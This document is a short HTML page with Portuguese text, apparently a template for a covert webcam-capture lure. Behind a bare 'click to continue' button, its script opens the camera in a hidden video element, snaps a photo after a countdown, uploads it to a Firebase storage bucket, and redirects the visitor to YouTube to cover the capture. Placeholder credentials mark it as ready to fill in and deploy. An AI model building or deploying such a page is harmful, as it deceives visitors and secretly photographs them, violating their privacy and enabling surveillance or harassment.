<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #111;
    color: white;
    flex-direction: column;
}

button {
    padding: 18px 30px;
    font-size: 18px;
    border-radius: 10px;
    border: none;
    background: #00ff88;
    font-weight: bold;
}

#countdown {
    font-size: 50px;
    margin-top: 20px;
}
</style>
</head>

<body>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>
<button id="btn">Clique aqui para continuar</button>
<div id="countdown"></div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js"></script>

<script>
// 🔥 COLOCA SUA CONFIG AQUI
const firebaseConfig = {
  apiKey: "SUA_API_KEY",
  authDomain: "SEU_PROJETO.firebaseapp.com",
  projectId: "SEU_PROJETO",
  storageBucket: "SEU_PROJETO.appspot.com",
};

// inicializa
firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();

document.getElementById("btn").addEventListener("click", start);

async function start() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("webcam");

    video.srcObject = stream;
    await video.play();

    document.getElementById("btn").style.display = "none";

    let count = 3;
    const el = document.getElementById("countdown");
    el.innerText = count;

    const interval = setInterval(() => {
        count--;
        el.innerText = count > 0 ? count : "📸";

        if (count < 0) {
            clearInterval(interval);

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            canvas.getContext("2d").drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const ref = storage.ref("fotos/" + Date.now() + ".jpg");

                await ref.put(blob);

                stream.getTracks().forEach(t => t.stop());

                window.location.href = "https://youtube.com";
            }, "image/jpeg", 0.9);
        }

    }, 1000);
}
</script>

</body>
</html>
